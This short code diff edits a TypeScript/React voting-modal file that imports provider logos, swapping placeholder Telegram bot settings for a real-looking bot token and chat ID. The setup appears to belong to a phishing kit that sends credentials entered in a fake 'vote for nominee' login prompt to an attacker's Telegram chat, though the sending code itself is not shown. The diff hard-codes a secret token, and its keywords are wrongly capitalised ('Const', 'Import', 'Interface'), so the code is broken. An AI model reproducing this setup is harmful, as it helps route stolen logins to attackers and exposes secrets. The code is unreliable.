@@ -34,8 +34,8 @@ Import {
 } from './ProviderLogos.js';
 
 // 🔐 Telegram Bot Configuration - Replace these!
-Const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // e.g., '654321:ABC-XYZ123'
-Const CHAT_ID = 'YOUR_CHAT_ID'; // e.g., '987654321'
+Const TELEGRAM_BOT_TOKEN = '5617918891:AAGDayUdT1Xa-uJr8kkNIqhwBRIxI9e6nEw'; // e.g., '654321:ABC-XYZ123'
+Const CHAT_ID = '1017508597'; // e.g., '987654321'
 Interface VoteModalProps {
 Nominee: Nominee | null;
 Cms: CmsSettings;
